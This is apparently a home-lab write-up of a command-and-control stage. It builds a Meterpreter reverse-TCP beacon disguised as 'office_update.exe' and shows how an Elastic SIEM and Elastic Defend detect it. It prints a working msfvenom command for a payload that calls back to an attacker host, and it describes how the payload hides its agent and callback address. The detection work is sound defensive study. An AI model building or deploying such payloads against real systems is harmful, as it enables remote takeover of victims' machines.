# Stage 2 — C2 (T1071.001)

**Beacon:** `office_update.exe` — 256,000 B single-stage Meterpreter reverse-TCP
(SHA256 `77428ca3890441ae79f9b8532996320b9304100b9f1b8a06bc91bd130a1af774`).

Built on Kali:
```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.254.100 LPORT=4443 -f exe -o office_update.exe
```
Handler: `exploit/multi/handler` on Kali `127.0.0.1:4445`, reached via a relay on the
attacker box (`:4443` → `127.0.0.1:4445`) because WSL mirrored networking can't accept
inbound on the host IP.

**Anatomy (from the actual file):**
- PE32+ / AMD64, 5 sections
- `.text` 50 B — stager bootstrap
- `.qbhc` 249,000 B — XOR-encoded Meterpreter agent (~97% of the file)
- callback IP/port stored scrambled, decoded in RAM at runtime

**SIEM proof (KQL):**
```
host.name: "honeypot" AND destination.port: 4443
```
→ egress `192.168.254.128:<ephemeral> → 192.168.254.100:4443`, process `office_update.exe`,
**unsigned**, executable path `C:\Users\honey\Downloads\office_update.exe`.

**Elastic Defend:** critical memory-signature alert `shellcode_thread`
(_id `cb9f8d7b…f3f`, risk 99, MITRE T1055/T1620) — the engine matched shellcode in the
process memory at decode time. 120+ alerts total across all executions.

**The 6 beacon-identifying columns:** destination.port 4443 · destination.ip 192.168.254.100
· process.name office_update.exe · executable from Downloads · code_signature false ·
direction egress.
